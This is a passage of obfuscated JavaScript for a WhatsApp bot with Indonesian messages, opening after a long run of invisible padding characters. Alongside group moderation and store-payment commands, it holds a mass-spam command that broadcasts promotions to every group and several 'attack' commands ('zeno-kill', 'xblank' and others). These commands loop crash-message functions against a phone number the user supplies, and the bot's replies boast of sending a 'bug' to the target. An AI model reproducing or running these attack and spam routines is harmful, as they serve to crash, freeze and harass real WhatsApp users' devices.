‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n";
          for (let _0x7c8077 of _0x229bdc) {
            _0x4de6f0 += "⊝ @" + _0x7c8077.id.split('@')[0x0] + "\n";
          }
          HadzzModa.sendMessage(_0xe0b9f4.chat, {
            'text': _0x4de6f0,
            'mentions': _0x229bdc.map(_0x30f60d => _0x30f60d.id)
          }, {
            'quoted': _0xe0b9f4
          });
        }
        break;
      case "kick":
        {
          if (!_0x2535de) {
            return _0xd6f2c2("Only Group");
          }
          if (!_0x19ae44 && !_0xd5b998) {
            return _0xd6f2c2("Only Admin");
          }
          if (!_0x31ce92) {
            return _0xd6f2c2("Bot Bukan Admin :(");
          }
          let _0x22197e = _0xe0b9f4.quoted ? _0xe0b9f4.quoted.sender : _0x2741d2.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x1e35db.groupParticipantsUpdate(_0xe0b9f4.chat, [_0x22197e], "remove").then(_0x23ae08 => _0xd6f2c2(util.format(_0x23ae08)))["catch"](_0x174202 => _0xd6f2c2(util.format(_0x174202)));
        }
        break;
      case "closegroup":
        {
          if (!_0x2535de) {
            return _0xd6f2c2("Khusus Group Tolol");
          }
          if (!_0x19ae44 && !_0xd5b998) {
            return _0xd6f2c2("Khusus Admin");
          }
          if (!_0x31ce92) {
            return _0xd6f2c2("Bot Bukan Admin Bego");
          }
          if (!_0x34b560[0x0]) {
            return _0xd6f2c2("*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n" + (_0x270d27 + _0x539f0c) + "10 second");
          }
          if (_0x34b560[0x1] == "second") {
            var _0x5aed9e = _0x34b560[0x0] * "1000";
          } else {
            if (_0x34b560[0x1] == "minute") {
              var _0x5aed9e = _0x34b560[0x0] * "60000";
            } else {
              if (_0x34b560[0x1] == "hour") {
                var _0x5aed9e = _0x34b560[0x0] * "3600000";
              } else {
                if (_0x34b560[0x1] == "day") {
                  var _0x5aed9e = _0x34b560[0x0] * "86400000";
                }
              }
            }
          }
          _0xd6f2c2("*Waktu dimulai dari sekarang*");
          setTimeout(() => {
            _0x1e35db.groupSettingUpdate(_0xe0b9f4.chat, 'announcement');
            _0xd6f2c2("Grup Ditutup!\nGrup Ditutup Oleh Bot Dikarenakan Admin Lagi Comli\nGrup Akan Dibuka Kalau Admin Sudah Crt 2 Kali");
          }, _0x5aed9e);
        }
        break;
      case 'opengroup':
        {
          if (!_0x2535de) {
            return _0xd6f2c2("Khusus Group Tolol");
          }
          if (!_0x19ae44 && !_0xd5b998) {
            return _0xd6f2c2("Khusus Admin");
          }
          if (!_0x31ce92) {
            return _0xd6f2c2("Bot Bukan Admin Bego");
          }
          if (!_0x34b560[0x0]) {
            return _0xd6f2c2("*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n" + (_0x270d27 + _0x539f0c) + "10 second");
          }
          if (_0x34b560[0x1] == "second") {
            var _0x5aed9e = _0x34b560[0x0] * "1000";
          } else {
            if (_0x34b560[0x1] == "minute") {
              var _0x5aed9e = _0x34b560[0x0] * "60000";
            } else {
              if (_0x34b560[0x1] == "hour") {
                var _0x5aed9e = _0x34b560[0x0] * "3600000";
              } else {
                if (_0x34b560[0x1] == "day") {
                  var _0x5aed9e = _0x34b560[0x0] * "86400000";
                }
              }
            }
          }
          _0xd6f2c2("*Waktu dimulai dari sekarang*");
          setTimeout(() => {
            _0x1e35db.groupSettingUpdate(_0xe0b9f4.chat, 'not_announcement');
            _0xd6f2c2("Admin Sudah Crt 2 Kali, Grup Dibuka Kawan");
          }, _0x5aed9e);
        }
        break;
      case "demote":
        {
          if (!_0x37e4b2) {
            return _0xd6f2c2(mess.only.premium);
          }
          if (!_0x2535de) {
            return _0xd6f2c2("Only Group");
          }
          if (!_0x19ae44 && !_0xd5b998) {
            return _0xd6f2c2("Only Admin");
          }
          if (!_0x31ce92) {
            return _0xd6f2c2("Bot Bukan Admin :(");
          }
          let _0x3f7dfb = _0xe0b9f4.mentionedJid[0x0] ? _0xe0b9f4.mentionedJid[0x0] : _0xe0b9f4.quoted ? _0xe0b9f4.quoted.sender : _0x2741d2.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x1e35db.groupParticipantsUpdate(_0xe0b9f4.chat, [_0x3f7dfb], "demote").then(_0xef761c => _0xd6f2c2(util.format(_0xef761c)))["catch"](_0x44ea8e => _0xd6f2c2(util.format(_0x44ea8e)));
        }
        break;
      case "promote":
        {
          if (!_0x2535de) {
            return _0xd6f2c2("Only Group");
          }
          if (!_0x19ae44 && !_0xd5b998) {
            return _0xd6f2c2("Only Admin");
          }
          if (!_0x31ce92) {
            return _0xd6f2c2("Bot Bukan Admin :(");
          }
          let _0x199a6f = _0xe0b9f4.quoted ? _0xe0b9f4.quoted.sender : _0x2741d2.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x1e35db.groupParticipantsUpdate(_0xe0b9f4.chat, [_0x199a6f], "add").then(_0x5e9bc2 => _0xd6f2c2(util.format(_0x5e9bc2)))['catch'](_0x51071f => _0xd6f2c2(util.format(_0x51071f)));
        }
        break;
      case 'jpmpromosi':
      case "jpmpromo":
      case 'jpm3':
        {
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          if (!_0x2741d2 && !_0xe0b9f4.quoted) {
            return _0xe0b9f4.reply("teksnya atau replyteks");
          }
          var _0xf47fd4 = _0xe0b9f4.quoted ? _0xe0b9f4.quoted.text : _0x2741d2;
          let _0x5997c9 = 0x0;
          let _0x582aa3 = await _0x1e35db.groupFetchAllParticipating();
          let _0x1d6df3 = Object.entries(_0x582aa3).slice(0x0).map(_0x3963b1 => _0x3963b1[0x1]);
          let _0x93226 = _0x1d6df3.filter(_0x2fa77d => _0x2fa77d.announce == false);
          let _0x3f2f78 = _0x93226.map(_0x4244b0 => _0x4244b0.id);
          _0xe0b9f4.reply("Memproses Mengirim Pesan Ke *" + _0x3f2f78.length + " Grup*");
          let _0xa4e0f = generateWAMessageFromContent(_0xe0b9f4.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'contextInfo': {
                    'mentionedJid': [_0xe0b9f4.sender],
                    'externalAdReply': {
                      'showAdAttribution': true
                    }
                  },
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': _0xf47fd4
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"Chat Owner\",\"url\":\"" + global.url + "\",\"merchant_url\":\"" + global.url + "\"}"
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"YouTube Owner\",\"url\":\"" + linkyt + "\",\"merchant_url\":\"https://youtube.com/@drayyyxd\"}"
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"Testi Di whatsapp\",\"url\":\"" + global.url + "\",\"merchant_url\":\"" + global.url + "\"}"
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"Donate My Dev🙏\",\"url\":\"https://saweria.co/DrayXD\",\"merchant_url\":\"https://saweria.co/DrayXD\"}"
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': _0xe0b9f4.sender,
            'quoted': _0xe0b9f4
          });
          for (let _0x2f77c0 of _0x3f2f78) {
            try {
              await _0x1e35db.relayMessage(_0x2f77c0, _0xa4e0f.message, {
                'messageId': _0xa4e0f.key.id
              });
              _0x5997c9 += 0x1;
            } catch {}
            await sleep(global.delayjpm);
          }
          _0xe0b9f4.reply("Berhasil Mengirim Pesan Ke *" + _0x5997c9 + " Grup*");
        }
        break;
      case "payment":
        {
          let _0x669c8e = "```PAYMENT```\n\n*PAYMENT KAMI*\n\n   *DANA*\nᐖ " + dana + "\n\nHarap Setelah Transfer Anda Harus Mengasih Bukti Pembayaran Agar Di Verifikasi Oleh Owner, Tanks For You\n\n© " + storename;
          _0x1e35db.sendMessage(_0x391d98, {
            'text': _0x669c8e,
            'contextInfo': {
              'forwardingScore': 0x98967f,
              'isForwarded': true,
              'mentionedJid': [_0xe0b9f4.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'renderLargerThumbnail': false,
                'title': "QRIS? KLIK DISINI",
                'body': "Date : " + _0xf8922c + ", " + _0x407c9f,
                'containsAutoReply': true,
                'mediaType': 0x1,
                'thumbnailUrl': 'https://b.top4top.io/p_3194nb6rt0.jpeg',
                'sourceUrl': '' + qris
              }
            }
          }, {
            'quoted': _0x2205e2
          });
          await sleep(0x5dc);
        }
        break;
      case 'danamasuk':
        {
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          let _0x241c20 = "*DONE DANA MASUK*\n\nReqname :\n\n▰▰▰▰▰▰▰▰\n*Garansi 7 Day*\n*Create " + _0xf8922c + "*\n*Hari Ini " + _0x545db7 + '*';
          _0x1e35db.sendMessage(_0x391d98, {
            'text': _0x241c20
          }, {
            'quoted': _0xe0b9f4
          });
        }
        break;
      case "proses":
        {
          _0xe0b9f4.reply("*SIAP PESANAN ANDA AKAN KAMI PROSES JADI DI MOHON UNTUK MENUNGGU SEBENTAR YA KONTOL*");
          _0x1e35db.sendMessage("6285789034010@s.whatsapp.net", {
            'text': "BANG DRAY ADA YANG TRX NIH CEPETAN PROSES NANTI BUYER NGAMOK",
            'contextInfo': {
              'forwardingScore': 0x270f,
              'isForwarded': true
            }
          });
        }
        break;
      case "done":
      case 'd':
        {
          if (!_0xd5b998) {
            return _0xd6f2c2("Njirr Lu siapa Cuk");
          }
          let _0x7b9136 = _0x2741d2.split(',');
          let _0x45fa6a = _0x7b9136[0x0];
          let _0x4873b9 = _0x7b9136[0x1];
          if (_0x7b9136.length < 0x2) {
            return _0xd6f2c2("*Format salah!*\nPenggunaan:\n" + (_0x270d27 + _0x539f0c) + " barang,nominal");
          }
          if (!_0x45fa6a) {
            return _0xd6f2c2("Ex : " + (_0x270d27 + _0x539f0c) + " barang,nominal\n\nContoh :\n" + (_0x270d27 + _0x539f0c) + " vipies,60000");
          }
          if (!_0x4873b9) {
            return _0xd6f2c2("Ex : " + (_0x270d27 + _0x539f0c) + " barang,nominal\n\nContoh :\n" + (_0x270d27 + _0x539f0c) + " panel,1000");
          }
          text_done = "「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」\n\n📦 Barang : " + _0x45fa6a + "\n💸 Nominal : " + _0x4873b9 + "\n📆 Tanggal : " + _0xf8922c + "\n🕰️ Waktu : " + _0x4c0ab5 + "\n✨ Status : Berhasil\n\n𝗧𝗲𝗿𝗶𝗺𝗮𝗸𝗮𝘀𝗶𝗵 𝗧𝗲𝗹𝗮𝗵 𝗢𝗿𝗱𝗲𝗿 𝗗𝗶 *" + storename + '*';
          await _0x1e35db.relayMessage(_0xe0b9f4.chat, {
            'requestPaymentMessage': {
              'currencyCodeIso4217': 'IDR',
              'amount1000': _0x4873b9 + '*100000',
              'requestFrom': _0xe0b9f4.sender,
              'noteMessage': {
                'extendedTextMessage': {
                  'text': text_done,
                  'contextInfo': {
                    'externalAdReply': {
                      'showAdAttribution': true
                    }
                  }
                }
              }
            }
          }, {});
        }
        break;
      case "sticker":
      case "stiker":
      case 's':
        {
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          if (!_0x254ceb) {
            return _0xd6f2c2("Kirim/Reply Gambar/Video/Gifs Dengan Caption " + (_0x270d27 + _0x539f0c) + "\nDurasi Video 1-9 Detik");
          }
          if (/image/.test(_0x5343b2)) {
            let _0x4c8d0e = await _0x254ceb.download();
            let _0x305522 = await _0x1e35db.sendStimg(_0x391d98, _0x4c8d0e, _0xe0b9f4, {
              'packname': global.packname,
              'author': global.author
            });
            await fs.unlinkSync(_0x305522);
          } else {
            if (/video/.test(_0x5343b2)) {
              if ((_0x254ceb.msg || _0x254ceb).seconds > 0xb) {
                return _0xd6f2c2("Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik");
              }
              let _0x437028 = await _0x254ceb.download();
              let _0x386c75 = await _0x1e35db.sendStvid(_0x391d98, _0x437028, _0xe0b9f4, {
                'packname': global.packname,
                'author': global.author
              });
              await fs.unlinkSync(_0x386c75);
            } else {
              _0xd6f2c2("Kirim/Reply Gambar/Video/Gifs Dengan Caption " + (_0x270d27 + _0x539f0c) + "\nDurasi Video 1-9 Detik");
            }
          }
        }
        break;
      case "zeno-1hari":
        if (!_0x37e4b2) {
          return _0xd6f2c2(mess.only.premium);
        }
        if (!q) {
          return _0xd6f2c2("Example: " + (_0x270d27 + _0x539f0c) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        _0xd6f2c2("〘 𝐙𝐄𝐍𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐓𝐀𝐓𝐆𝐄𝐓 〙\n𝙷𝚊𝚛𝚊𝚙 𝙱𝚎𝚛𝚜𝚊𝚋𝚊𝚛 𝚙𝚛𝚘𝚜𝚎𝚜 𝚊𝚝𝚝𝚊𝚌𝚔 𝚖𝚎𝚖𝚊𝚔𝚊𝚗 𝚠𝚊𝚔𝚝𝚞 𝚢𝚊𝚗𝚐 𝚕𝚞𝚖𝚊𝚢𝚊𝚗 𝚕𝚊𝚖𝚊, 𝚓𝚊𝚗𝚐𝚊𝚗 𝚐𝚞𝚗𝚊𝚊𝚔𝚊𝚗 𝚋𝚘𝚝 𝚜𝚊𝚊𝚝 𝚖𝚊𝚜𝚒𝚑 𝚙𝚛𝚘𝚜𝚎𝚜 𝚙𝚎𝚗𝚢𝚎𝚛𝚊𝚗𝚗𝚐𝚊𝚗♨︎");
        for (let _0x2f5051 = 0x0; _0x2f5051 < 0x32; _0x2f5051++) {
          await _0x547ce8(_0x1e35db, target, 'p', 0xf9060, ptcp = true);
          await _0x21ef80(target, _0x305bf0);
          await _0x21ef80(target, _0x305bf0);
          await _0x5ad42c(_0x1e35db, target, _0x305bf0);
          await _0x273ce5(target, _0x305bf0);
          await _0x32e71d(_0x1e35db, target, _0x305bf0);
        }
        _0xd6f2c2("『 𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐀𝐓𝐓𝐀𝐂𝐊 』\n\n𖡟 𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𖡟 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗕𝗮𝗻𝗴 ☑\n\n    📌𝐍𝐎𝐓𝐄\n> Bug Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
        break;
      case "darkness":
      case "zeno-war":
      case "zeno-marah":
      case 'slayer':
      case "zeno-kill":
        if (!_0x37e4b2) {
          return _0xd6f2c2(mess.only.premium);
        }
        if (!q) {
          return _0xd6f2c2("Example: " + (_0x270d27 + _0x539f0c) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0xd6f2c2("〘 𝐙𝐄𝐍𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐓𝐀𝐓𝐆𝐄𝐓 〙\n𝙷𝚊𝚛𝚊𝚙 𝙱𝚎𝚛𝚜𝚊𝚋𝚊𝚛 𝚙𝚛𝚘𝚜𝚎𝚜 𝚊𝚝𝚝𝚊𝚌𝚔 𝚖𝚎𝚖𝚊𝚔𝚊𝚗 𝚠𝚊𝚔𝚝𝚞 𝚢𝚊𝚗𝚐 𝚕𝚞𝚖𝚊𝚢𝚊𝚗 𝚕𝚊𝚖𝚊, 𝚓𝚊𝚗𝚐𝚊𝚗 𝚐𝚞𝚗𝚊𝚊𝚔𝚊𝚗 𝚋𝚘𝚝 𝚜𝚊𝚊𝚝 𝚖𝚊𝚜𝚒𝚑 𝚙𝚛𝚘𝚜𝚎𝚜 𝚙𝚎𝚗𝚢𝚎𝚛𝚊𝚗𝚗𝚐𝚊𝚗♨︎");
        for (let _0x9ae863 = 0x0; _0x9ae863 < 0x32; _0x9ae863++) {
          await _0x547ce8(_0x1e35db, target, 'p', 0xf9060, ptcp = true);
          await _0x21ef80(target, _0x305bf0);
          await _0x21ef80(target, _0x305bf0);
          await _0x5ad42c(_0x1e35db, target, _0x305bf0);
          await _0x273ce5(target, _0x305bf0);
          await _0x32e71d(_0x1e35db, target, _0x305bf0);
        }
        _0xd6f2c2("『 𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐀𝐓𝐓𝐀𝐂𝐊 』\n\n𖡟 𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𖡟 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗕𝗮𝗻𝗴 ☑\n\n    📌𝐍𝐎𝐓𝐄\n> Bug Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
        break;
      case "infinity":
      case 'xblank':
        if (!_0x37e4b2) {
          return _0xd6f2c2(mess.only.premium);
        }
        if (!q) {
          return _0xd6f2c2("Example: " + (_0x270d27 + _0x539f0c) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0xd6f2c2("〘 𝐙𝐄𝐍𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐓𝐀𝐓𝐆𝐄𝐓 〙\n𝙷𝚊𝚛𝚊𝚙 𝙱𝚎𝚛𝚜𝚊𝚋𝚊𝚛 𝚙𝚛𝚘𝚜𝚎𝚜 𝚊𝚝𝚝𝚊𝚌𝚔 𝚖𝚎𝚖𝚊𝚔𝚊𝚗 𝚠𝚊𝚔𝚝𝚞 𝚢𝚊𝚗𝚐 𝚕𝚞𝚖𝚊𝚢𝚊𝚗 𝚕𝚊𝚖𝚊, 𝚓𝚊𝚗𝚐𝚊𝚗 𝚐𝚞𝚗𝚊𝚊𝚔𝚊𝚗 𝚋𝚘𝚝 𝚜𝚊𝚊𝚝 𝚖𝚊𝚜𝚒𝚑 𝚙𝚛𝚘𝚜𝚎𝚜 𝚙𝚎𝚗𝚢𝚎𝚛𝚊𝚗𝚗𝚐𝚊𝚗♨︎");
        for (let _0x5eae89 = 0x0; _0x5eae89 < 0x1e; _0x5eae89++) {
          await _0x547ce8(_0x1e35db, target, 'p', 0xf9060, ptcp = true);
          await _0x21ef80(target, _0x305bf0);
          await _0x21ef80(target, _0x305bf0);
          await _0x5ad42c(_0x1e35db, target, _0x305bf0);
          await _0x273ce5(target, _0x305bf0);
          await _0x32e71d(_0x1e35db, target, _0x305bf0);
        }
